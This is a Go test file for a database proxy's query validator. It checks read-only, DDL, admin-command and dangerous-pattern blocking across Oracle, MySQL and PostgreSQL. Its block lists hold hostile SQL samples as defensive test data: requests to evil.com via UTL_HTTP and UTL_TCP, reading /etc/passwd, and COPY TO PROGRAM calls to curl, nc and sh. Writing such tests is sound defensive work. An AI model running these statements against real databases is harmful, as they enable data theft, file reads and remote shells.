package shared

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fclairamb/dbbat/internal/store"
)

func TestValidateQuery_ReadOnly_BlocksWrites(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	// GRANT/REVOKE are now caught earlier by the always-on admin block
	// (ErrAdminCommandBlocked), covered by TestValidateQuery_AdminCommands.
	blocked := []string{
		"INSERT INTO t VALUES (1)", "UPDATE t SET x = 1", "DELETE FROM t WHERE id = 1",
		"MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = s.x",
		"DROP TABLE t", "TRUNCATE TABLE t", "CREATE TABLE t (id NUMBER)",
		"ALTER TABLE t ADD (col VARCHAR2(100))",
	}
	for _, sql := range blocked {
		require.ErrorIs(t, ValidateQuery(sql, grant), ErrReadOnlyViolation, "should block: %s", sql)
	}
}

func TestValidateQuery_ReadOnly_AllowsReads(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	allowed := []string{
		"SELECT * FROM t", "SELECT 1 FROM DUAL",
		"WITH cte AS (SELECT 1 FROM DUAL) SELECT * FROM cte",
		"EXPLAIN PLAN FOR SELECT * FROM t", "  select * from t  ",
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateQuery_BlockDDL(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlBlockDDL}}
	blocked := []string{
		"CREATE TABLE t (id NUMBER)", "ALTER TABLE t ADD (col NUMBER)", "DROP TABLE t",
		"CREATE INDEX idx ON t(col)", "CREATE OR REPLACE VIEW v AS SELECT 1 FROM DUAL",
		"CREATE SEQUENCE s", "ALTER INDEX idx REBUILD",
	}
	allowed := []string{"INSERT INTO t VALUES (1)", "SELECT * FROM t", "UPDATE t SET x = 1"}

	for _, sql := range blocked {
		require.ErrorIs(t, ValidateQuery(sql, grant), ErrDDLBlocked, "should block: %s", sql)
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateQuery_CaseInsensitive(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.Error(t, ValidateQuery("insert INTO t VALUES (1)", grant))
	require.Error(t, ValidateQuery("  INSERT INTO t VALUES (1)  ", grant))
}

func TestValidateQuery_LeadingCommentStripped(t *testing.T) {
	t.Parallel()

	// A leading comment must not let a statement bypass classification.
	roGrant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.ErrorIs(t, ValidateQuery("/* sneaky */ INSERT INTO t VALUES (1)", roGrant), ErrReadOnlyViolation)
	require.ErrorIs(t, ValidateQuery("-- sneaky\nINSERT INTO t VALUES (1)", roGrant), ErrReadOnlyViolation)

	// Admin commands are always blocked even behind a leading comment, on a
	// full-write grant.
	writeGrant := &store.Grant{}
	require.ErrorIs(t, ValidateQuery("/* hi */ ALTER ROLE x SUPERUSER", writeGrant), ErrAdminCommandBlocked)
	require.ErrorIs(t, ValidateQuery("/* a */ /* b */ GRANT ALL ON t TO u", writeGrant), ErrAdminCommandBlocked)

	// A genuinely harmless commented read still passes.
	assert.NoError(t, ValidateQuery("/* harmless */ SELECT * FROM t", roGrant))
}

func TestValidateQuery_PasswordChange(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // No restrictions
	require.ErrorIs(t, ValidateQuery("ALTER USER bob PASSWORD 'secret'", grant), ErrPasswordChangeBlocked)
	require.ErrorIs(t, ValidateQuery("ALTER ROLE admin PASSWORD 'secret'", grant), ErrPasswordChangeBlocked)
	assert.NoError(t, ValidateQuery("ALTER TABLE t ADD (col NUMBER)", grant))
}

func TestValidateOracleQuery_BlocksDangerousPatterns(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // No restrictions — patterns always blocked
	blocked := []struct{ sql, reason string }{
		{"ALTER SYSTEM SET open_cursors=1000", "system config"},
		{"ALTER SYSTEM KILL SESSION '123,456'", "kill session"},
		{"CREATE DATABASE LINK remote CONNECT TO u IDENTIFIED BY p USING 'tns'", "network escape"},
		{"BEGIN DBMS_SCHEDULER.CREATE_JOB('job1'); END;", "async execution"},
		{"SELECT UTL_HTTP.REQUEST('http://evil.com') FROM DUAL", "network access"},
		{"SELECT UTL_FILE.FOPEN('/etc/passwd','r') FROM DUAL", "file system access"},
		{"BEGIN DBMS_PIPE.SEND_MESSAGE('pipe'); END;", "IPC escape"},
		{"BEGIN UTL_TCP.OPEN_CONNECTION('evil.com', 80); END;", "network escape"},
		{"BEGIN DBMS_JOB.SUBMIT(1, 'BEGIN NULL; END;'); END;", "async execution"},
	}
	for _, tt := range blocked {
		t.Run(tt.reason, func(t *testing.T) {
			t.Parallel()
			assert.ErrorIs(t, ValidateOracleQuery(tt.sql, grant), ErrOraclePatternBlocked)
		})
	}
}

func TestValidateOracleQuery_AllowsSafePLSQL(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // No restrictions
	allowed := []string{
		"BEGIN my_pkg.read_data(:1, :2); END;",
		"DECLARE v NUMBER; BEGIN SELECT COUNT(*) INTO v FROM t; END;",
		"BEGIN NULL; END;",
		"SELECT * FROM employees",
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateOracleQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateOracleQuery_CombinesSharedAndOracleChecks(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.ErrorIs(t, ValidateOracleQuery("INSERT INTO t VALUES (1)", grant), ErrReadOnlyViolation)
	require.ErrorIs(t, ValidateOracleQuery("SELECT UTL_HTTP.REQUEST('x') FROM DUAL", grant), ErrOraclePatternBlocked)
}

func TestValidateMySQLQuery_BlocksDangerousPatterns(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // no grant restrictions — patterns always blocked
	blocked := []struct{ sql, reason string }{
		{"LOAD DATA INFILE '/tmp/x.csv' INTO TABLE t", "server-side file read"},
		{"LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t", "client-side exfiltration"},
		{"SELECT * FROM t INTO OUTFILE '/tmp/out.csv'", "server-side file write"},
		{"SELECT col FROM t INTO DUMPFILE '/tmp/d.bin'", "binary file write"},
		{"SET GLOBAL max_connections = 1000", "server-wide config change"},
		{"SET PASSWORD FOR 'bob' = 'secret'", "password change"},
	}
	for _, tt := range blocked {
		t.Run(tt.reason, func(t *testing.T) {
			t.Parallel()
			assert.ErrorIs(t, ValidateMySQLQuery(tt.sql, grant), ErrMySQLPatternBlocked)
		})
	}
}

func TestValidateMySQLQuery_AllowsSafeQueries(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // no restrictions
	allowed := []string{
		"SELECT * FROM users",
		"SELECT REPLACE(name, 'old', 'new') FROM t", // REPLACE() function, not REPLACE INTO
		"SET SESSION sql_mode = 'STRICT_TRANS_TABLES'",
		"SELECT NOW()",
		"SHOW TABLES",
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateMySQLQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateMySQLQuery_CombinesSharedAndMySQLChecks(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.ErrorIs(t, ValidateMySQLQuery("INSERT INTO t VALUES (1)", grant), ErrReadOnlyViolation)
	require.ErrorIs(t, ValidateMySQLQuery("REPLACE INTO t VALUES (1)", grant), ErrReadOnlyViolation)
	require.ErrorIs(t, ValidateMySQLQuery("LOAD DATA INFILE '/x' INTO TABLE t", grant), ErrMySQLPatternBlocked)
}

// adminCommandSQL lists privilege/identity administration statements that must be
// always blocked on every protocol.
var adminCommandSQL = []string{
	"ALTER ROLE x SUPERUSER",
	"ALTER USER x CREATEROLE",
	"ALTER USER 'bob'@'%' REQUIRE SSL", // non-password ALTER USER (MySQL form)
	"CREATE ROLE r",
	"CREATE USER u",
	"DROP ROLE r",
	"DROP USER u",
	"RENAME USER a TO b",
	"GRANT SELECT ON t TO u",
	"GRANT ALL PRIVILEGES ON *.* TO 'bob'@'%'",
	"REVOKE SELECT ON t FROM u",
}

func TestValidateQuery_AdminCommands(t *testing.T) {
	t.Parallel()

	// Blocked on the shared path (MySQL + Oracle) regardless of grant controls,
	// and detected by IsAdminCommand (the PostgreSQL proxy's detector).
	grants := map[string]*store.Grant{
		"no controls": {},
		"read_only":   {Controls: []string{store.ControlReadOnly}},
		"block_ddl":   {Controls: []string{store.ControlBlockDDL}},
	}

	for _, sql := range adminCommandSQL {
		for name, grant := range grants {
			require.ErrorIs(t, ValidateQuery(sql, grant), ErrAdminCommandBlocked, "ValidateQuery %q (%s)", sql, name)
			require.ErrorIs(t, ValidateMySQLQuery(sql, grant), ErrAdminCommandBlocked, "ValidateMySQLQuery %q (%s)", sql, name)
			require.ErrorIs(t, ValidateOracleQuery(sql, grant), ErrAdminCommandBlocked, "ValidateOracleQuery %q (%s)", sql, name)
		}

		require.True(t, IsAdminCommand(sql), "IsAdminCommand %q", sql)
	}
}

func TestIsAdminCommand(t *testing.T) {
	t.Parallel()

	admin := []string{
		"ALTER ROLE r SUPERUSER", "ALTER USER u NOCREATEDB", "ALTER GROUP g ADD USER u",
		"CREATE ROLE r", "CREATE USER u", "CREATE GROUP g",
		"DROP ROLE r", "DROP USER u",
		"RENAME USER a TO b",
		"GRANT SELECT ON t TO u", "REVOKE ALL ON t FROM u",
		"grant select on t to u",            // lowercase
		"/* c */ CREATE ROLE r",             // leading comment
		"SELECT 1; DROP ROLE r",             // trailing statement in a batch
		"  \n GRANT USAGE ON SCHEMA s TO r", // leading whitespace
	}
	for _, sql := range admin {
		require.True(t, IsAdminCommand(sql), "should be admin: %q", sql)
	}

	notAdmin := []string{
		"ALTER TABLE t ADD COLUMN c INT", "CREATE TABLE t (id INT)", "DROP TABLE t",
		"CREATE INDEX i ON t(c)", "CREATE USERS_ARCHIVE (id INT)", // USERS, not USER
		"SELECT * FROM user_roles", "SELECT grant_id FROM grants",
		"INSERT INTO t VALUES (1)", "UPDATE t SET x = 1", "SELECT * FROM t",
	}
	for _, sql := range notAdmin {
		require.False(t, IsAdminCommand(sql), "should not be admin: %q", sql)
	}
}

func TestIsPostgreSQLBlockedPattern(t *testing.T) {
	t.Parallel()

	blocked := []string{
		"ALTER SYSTEM SET work_mem = '1GB'",
		"ALTER SYSTEM RESET ALL",
		"COPY t FROM PROGRAM 'curl evil'",
		"COPY t TO PROGRAM 'nc attacker 1234'",
		"COPY (SELECT 1) TO PROGRAM 'sh'",
		"ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO r",
		"CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw",
		"CREATE FOREIGN DATA WRAPPER w HANDLER h",
		"SELECT 1; ALTER SYSTEM SET a = 1", // multi-statement
		"/* x */ ALTER SYSTEM SET a = 1",   // leading comment
	}
	for _, sql := range blocked {
		require.True(t, IsPostgreSQLBlockedPattern(sql), "should be blocked: %q", sql)
	}

	allowed := []string{
		"SELECT * FROM t",
		"COPY t TO STDOUT",
		"COPY t FROM STDIN",
		"COPY t (a, b) TO STDOUT",
		"CREATE TABLE t (id INT)",
		"CREATE FOREIGN TABLE ft (id INT) SERVER s", // FOREIGN TABLE, not SERVER/FDW
		"INSERT INTO t VALUES (1)",
	}
	for _, sql := range allowed {
		require.False(t, IsPostgreSQLBlockedPattern(sql), "should be allowed: %q", sql)
	}
}

func TestValidateQuery_MultiStatementBypass(t *testing.T) {
	t.Parallel()

	// An admin command hiding behind a leading read is still blocked.
	require.ErrorIs(t, ValidateQuery("SELECT 1; ALTER ROLE x SUPERUSER", &store.Grant{}), ErrAdminCommandBlocked)
	require.ErrorIs(t, ValidateQuery("SELECT 1; GRANT ALL ON t TO u", &store.Grant{}), ErrAdminCommandBlocked)

	// A write hiding behind a leading read is caught under read_only.
	roGrant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.ErrorIs(t, ValidateQuery("SELECT 1; DROP TABLE t", roGrant), ErrReadOnlyViolation)
}

func TestValidateQuery_OrdinaryWorkAllowedOnFullWrite(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // full write, no controls
	allowed := []string{
		"INSERT INTO t VALUES (1)", "UPDATE t SET x = 1", "DELETE FROM t WHERE id = 1",
		"SELECT * FROM t", "MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = s.x",
		"CREATE TABLE t (id INT)", "ALTER TABLE t ADD COLUMN c INT", "DROP TABLE t",
		"CREATE INDEX i ON t(c)", "WITH cte AS (SELECT 1) SELECT * FROM cte",
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateQuery(sql, grant), "should allow: %s", sql)
		require.NoError(t, ValidateMySQLQuery(sql, grant), "MySQL should allow: %s", sql)
		require.NoError(t, ValidateOracleQuery(sql, grant), "Oracle should allow: %s", sql)
	}
}

func TestValidateOracleQuery_BlocksAudit(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{}
	require.ErrorIs(t, ValidateOracleQuery("AUDIT SELECT ON employees", grant), ErrOraclePatternBlocked)
	require.ErrorIs(t, ValidateOracleQuery("NOAUDIT POLICY p", grant), ErrOraclePatternBlocked)
	// A table/column named "audit" must not be a false positive.
	require.NoError(t, ValidateOracleQuery("SELECT * FROM audit_log", grant))
	require.NoError(t, ValidateOracleQuery("SELECT a.audit FROM t a", grant))
}

func TestValidateMySQLQuery_BlocksNewPatterns(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{}
	blocked := []struct{ sql, reason string }{
		{"SET PERSIST max_connections = 1000", "persisted global config"},
		{"SET PERSIST_ONLY read_only = ON", "persist_only config"},
		{"INSTALL PLUGIN my_plugin SONAME 'plugin.so'", "plugin loading"},
		{"UNINSTALL PLUGIN my_plugin", "plugin removal"},
		{"CREATE FUNCTION my_udf RETURNS STRING SONAME 'udf.so'", "native UDF loading"},
		{"SHUTDOWN", "server shutdown"},
	}
	for _, tt := range blocked {
		require.ErrorIs(t, ValidateMySQLQuery(tt.sql, grant), ErrMySQLPatternBlocked, tt.reason)
	}

	// User/privilege admin on MySQL is caught by the shared admin block.
	require.ErrorIs(t, ValidateMySQLQuery("CREATE USER 'bob'@'%' IDENTIFIED BY 'x'", grant), ErrAdminCommandBlocked)
	require.ErrorIs(t, ValidateMySQLQuery("DROP USER 'bob'@'%'", grant), ErrAdminCommandBlocked)
	require.ErrorIs(t, ValidateMySQLQuery("GRANT ALL ON *.* TO 'bob'@'%'", grant), ErrAdminCommandBlocked)

	// A stored function without SONAME (not a UDF) is still allowed on full write.
	require.NoError(t, ValidateMySQLQuery("CREATE FUNCTION f() RETURNS INT RETURN 1", grant))
}
